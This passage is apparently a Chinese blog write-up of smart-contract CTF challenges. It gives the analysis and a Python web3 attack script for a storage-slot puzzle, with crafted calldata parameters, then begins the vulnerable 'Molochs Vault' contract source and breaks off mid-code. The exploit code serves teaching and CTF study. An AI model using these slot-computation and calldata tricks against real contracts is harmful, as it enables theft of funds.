class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyse-1\"><a href=\"#Analyse-1\" class=\"headerlink\" title=\"Analyse\"></a>Analyse</h2><p>关键点在于找到存储了ghost的slot，无非就是mapping和struct的存储结构：</p>\n<p>Mapping: sha3(key+slot)</p>\n<p>Struct: sha3(slot)+offset</p>\n<p>存储逻辑：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\">ghostInfo<span class=\"token punctuation\">[</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>prevrandao<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>coinbase<span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">.</span>chainid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">-</span> block<span class=\"token punctuation\">.</span>basefee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>ghost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>根据关键信息找到slot即可</p>\n<h2 id=\"Attack\"><a href=\"#Attack\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span> HTTPProvider\n<span class=\"token keyword\">import</span> time\n\nrpc <span class=\"token operator\">=</span> <span class=\"token string\">'url'</span>\nw3 <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">(</span>HTTPProvider<span class=\"token punctuation\">(</span>rpc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nprivatekey <span class=\"token operator\">=</span> <span class=\"token string\">'PVK'</span>\naddress <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>account<span class=\"token punctuation\">.</span>from_key<span class=\"token punctuation\">(</span>privatekey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>address\ndata <span class=\"token operator\">=</span> <span class=\"token string\">'factory.createcode'</span>\nnonce <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getTransactionCount<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span>\ngasPrice <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>gasPrice\n\ntransaction <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token string\">'from'</span><span class=\"token punctuation\">:</span> address<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'nonce'</span><span class=\"token punctuation\">:</span>nonce<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'gasPrice'</span><span class=\"token punctuation\">:</span> gasPrice<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'gas'</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3000000</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'data'</span><span class=\"token punctuation\">:</span> data<span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'chainId'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>chainId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'value'</span><span class=\"token punctuation\">:</span>Web3<span class=\"token punctuation\">.</span>toWei<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ether'</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\nsigned_tx1 <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>account<span class=\"token punctuation\">.</span>signTransaction<span class=\"token punctuation\">(</span>transaction<span class=\"token punctuation\">,</span> privatekey<span class=\"token punctuation\">)</span>\ntxn_hash1 <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>sendRawTransaction<span class=\"token punctuation\">(</span>signed_tx1<span class=\"token punctuation\">.</span>rawTransaction<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>txn_hash1<span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nw3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>wait_for_transaction_receipt<span class=\"token punctuation\">(</span>txn_hash1<span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nnumber <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>blockNumber<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\nblock <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getBlock<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#Since the test in the private chain, the transaction confirmation time is 1 block, so add one</span>\nmapping <span class=\"token operator\">=</span> <span class=\"token string\">'2'</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\nslot <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> number <span class=\"token operator\">+</span> mapping<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\norigin <span class=\"token operator\">=</span> <span class=\"token string\">'2b2E23ceC9921288f63F60A839E2B28235bc22ad'</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#origin</span>\nslot <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> origin <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nsender <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getTransactionReceipt<span class=\"token punctuation\">(</span>txn_hash1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'contractAddress'</span><span class=\"token punctuation\">]</span>\nslot <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> sender <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\ntimestamp <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\nslot <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> timestamp <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\ncoinbaser <span class=\"token operator\">=</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'miner'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#we cant get coinbase directly,so use block miner</span>\nslot <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> coinbaser <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\ndifficulty <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'totalDifficulty'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#block.difficulty</span>\nslot <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> difficulty <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n<span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getBlock<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>number<span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\nslot <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> <span class=\"token builtin\">hash</span> <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nchainId <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>chainId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>rjust<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span>\nslot <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> chainId <span class=\"token operator\">+</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\nslot <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>Web3<span class=\"token punctuation\">.</span>keccak<span class=\"token punctuation\">(</span>hexstr <span class=\"token operator\">=</span> slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>slot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>一些部分在代码注释中进行了解释</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20230405233715159.png\"></p>\n<p>slot为第二行</p>\n<p>参数如下（注释部分）：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">Parameters</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">uint256</span> totalRecipients<span class=\"token punctuation\">;</span><span class=\"token comment\">//3</span>\n    <span class=\"token builtin\">uint256</span> offset<span class=\"token punctuation\">;</span><span class=\"token comment\">//123456(make calldataload(offset) equl to 0)</span>\n    Recipients<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> recipients<span class=\"token punctuation\">;</span><span class=\"token comment\">//origin,1 ether</span>\n    <span class=\"token builtin\">bytes</span> slotKey<span class=\"token punctuation\">;</span><span class=\"token comment\">//slot</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"0x0E-Molochs-Vault\"><a href=\"#0x0E-Molochs-Vault\" class=\"headerlink\" title=\"0x0E Molochs Vault\"></a>0x0E Molochs Vault</h1><h2 id=\"Code-1\"><a href=\"#Code-1\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.7</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/*\nTitle: MolochVault\nAuthor: @Kodak_Rome\nInspiration from: https://molochdao.com/\n*/</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MOLOCH_VAULT</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bytes32</span> immutable Moloch<span class=\"token punctuation\">;</span> <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token builtin\">bytes32</span> immutable hy7UIH<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> immutable hsah<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> realHacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">Cabal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> identity<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">string</span> password<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> question<span class=\"token punctuation\">;</span>\n    Cabal<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> cabals<span class=\"token punctuation\">;</span>\n    \n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">initiation</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _id<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> _passW<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        Cabal<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> updatedCabal <span class=\"token operator\">=</span> cabals<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> lengthBefore <span class=\"token operator\">=</span> updatedCabal<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        Cabal <span class=\"token keyword\">memory</span> newCabal <span class=\"token operator\">=</span> <span class=\"token function\">Cabal</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>password<span class=\"token punctuation\">:</span> _passW<span class=\"token punctuation\">,</span>\n                                 identity<span class=\"token punctuation\">:</span> _id<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        realCabals<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>newCabal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> lengthAfter <span class=\"token operator\">=</span> realCabals<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">bool</span> initiated <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>lengthAfter  <span class=\"token operator\">>=</span> lengthBefore<span class=\"token punctuation\">,</span><span class=\"token string\">\"None added\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>initiated<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Status declined\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> initiated<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    Cabal<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> realCabals<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sendGrant</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _grantee<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>Moloch <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> realHacker<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Far $rm success!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> _grantee<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">1</span> wei<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token builtin\">bool</span> savage<span class=\"token punctuation\">;</span>\n    \n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">uhER778</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _openSecrete<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> RGDTjhU <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>hsah <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>_openSecrete<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">&lt;</span> <span class=\"token number\">3</span> gwei<span class=\"token punctuation\">,</span> <span class=\"token string\">\"success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>hy7UIH <span class=\"token operator\">==</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>_openSecrete<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>_openSecrete<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Hahahaha!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>_openSecrete<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>question<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"grant awarded!!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span 